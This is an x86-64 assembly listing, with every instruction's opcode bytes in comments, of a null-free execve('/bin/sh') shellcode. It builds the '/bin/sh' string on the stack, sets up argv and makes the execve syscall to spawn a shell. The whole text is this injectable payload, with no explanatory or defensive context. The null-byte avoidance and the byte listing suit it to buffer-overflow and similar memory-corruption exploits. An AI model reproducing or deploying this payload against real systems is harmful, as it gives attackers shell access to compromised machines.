	.text
	pushq	%rdi                       ; 0x57
	subq	$127, %rsp                 ; 0x4883EC7F
	xorq	%rax, %rax                 ; 0x4831C0
	xorq	%rdi, %rdi                 ; 0x4831FF
	xorq	%rsi, %rsi                 ; 0x4831F6
	xorq	%rdx, %rdx                 ; 0x4831D2
	movb	$59, %al                   ; 0xB03B
	movabsq	$7526411553527181311, %rbx ; 0x48BBFF2F62696E2F7368
	shrq	$8, %rbx                   ; 0x48C1EB08
	pushq	%rbx                       ; 0x53
	movq	%rsp, %rdi                 ; 0x4889E7
	pushq	%rsi                       ; 0x56
	pushq	%rdi                       ; 0x57
	movq	%rsp, %rsi                 ; 0x4889E6
	syscall                            ; 0x0F05
	xorq	%rax, %rax                 ; 0x4831C0
	retq                               ; 0xC3
